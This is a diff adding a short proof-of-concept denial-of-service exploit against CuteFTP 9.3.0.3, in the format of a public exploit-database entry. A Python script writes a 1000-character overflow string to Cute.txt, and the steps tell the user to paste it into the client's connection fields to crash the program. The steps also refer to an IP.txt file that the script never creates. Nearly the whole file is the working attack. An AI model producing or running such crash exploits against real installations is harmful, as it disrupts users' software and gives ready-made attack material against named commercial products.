@@ -1,0 +1,28 @@
+# Exploit Title: CuteFTP 9.3.0.3 - Denial of Service (PoC)
+# Date: 2018-11-05
+# Exploit Author: Ismael Nava
+# Vendor Homepage: https://www.globalscape.com/cuteftp
+# Software Link: https://www.globalscape.com/cuteftp
+# Version: 9.3.0.3
+# Tested on: Windows 10 Home x64
+# CVE : n/a
+
+# STEPS
+# Run the python exploit script, it will create a new .txt files
+# Open the program CuteFTP
+# Copy the content of the file "Cute.txt"
+# Paste the content in the fields Host, Username and Password
+# In the field "Hostname or IP" paste the content of the file "IP.txt"
+# Click in Connect
+# End :)
+
+buffer = 'A' * 1000
+
+try: 
+    file = open("Cute.txt","w")
+    file.write(buffer)
+    file.close()
+
+    print("Archive ready")
+except:
+    print("Archive no ready")
